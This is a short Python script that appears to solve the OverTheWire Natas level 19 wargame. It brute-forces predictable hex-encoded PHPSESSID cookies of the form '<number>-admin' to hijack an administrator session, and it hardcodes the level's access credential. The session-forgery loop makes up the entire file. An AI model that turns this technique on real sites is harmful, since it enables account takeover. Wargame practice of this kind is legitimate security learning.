import requests, string

target = 'http://natas19.natas.labs.overthewire.org'
auth = ('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
params = dict(username='admin', password='s3cr3t')
cookies = dict()


for i in range(1,640):
    test = (str(i) + "-admin").encode("utf-8").hex()
    print ("Trying with PHPSESSID = " + test)
    cookies = dict(PHPSESSID = test)
    r = requests.get(target, auth=auth, params=params, cookies=cookies)
    if "You are an admin" in r.text:
        print (r.text)
        break
